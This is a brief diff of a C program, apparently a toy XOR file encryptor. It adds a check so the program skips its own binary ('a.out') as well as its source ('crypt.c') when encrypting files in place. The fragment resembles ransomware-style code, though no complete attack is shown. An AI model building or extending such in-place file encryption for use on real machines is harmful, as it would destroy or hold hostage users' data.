@@ -17,7 +17,6 @@ void xorString (char *s) {
 }
 
 void cryptFile(char *filename) {
-
     // Read Buffer
     FILE *f = fopen(filename, "r+");
     fseek(f, 0, SEEK_END);
@@ -51,6 +50,10 @@ int isValidFile(char filename[]) {
     }
     // We definitely don't want to encrypt our decryptor...
         if (strcmp(filename, "crypt.c") == 0) {
+        return -1;
+    }
+    // Or our binaries
+        if (strcmp(filename, "a.out") == 0) {
         return -1;
     }
 
